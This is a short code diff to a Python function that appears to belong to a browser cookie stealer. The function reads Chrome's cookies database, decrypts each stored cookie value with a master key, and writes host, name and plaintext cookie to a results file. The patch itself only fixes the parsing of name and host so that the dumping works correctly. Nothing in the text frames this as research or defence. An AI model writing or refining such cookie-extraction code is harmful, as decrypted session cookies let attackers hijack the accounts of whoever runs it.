@@ -102,7 +102,7 @@ def Chrome_cookies(main_db,master_key):
         cursor.execute("select host_key,name,encrypted_value from cookies;")
         for host,name,en_cookies in cursor.fetchall():
             de_cookies=decrypt_value_all_version(en_cookies,master_key)
-            name=re.findall("b'(.*?)'",str(name));host=re.findall("b'(.*?)'",str(host))
+            name=re.findall("b'(.*?)'",str(name))[0];host=re.findall("b'(.*?)'",str(host))[0]
             data=f"Host: {str(host)}\nName: {str(name)}\nCookie: {str(de_cookies)}"+"\n"+"-"*50+"\n"
             with open('Results/Google Chrome/Chrome_Cookies.txt','a',encoding="utf-8") as f:f.write(data)
             i+=1
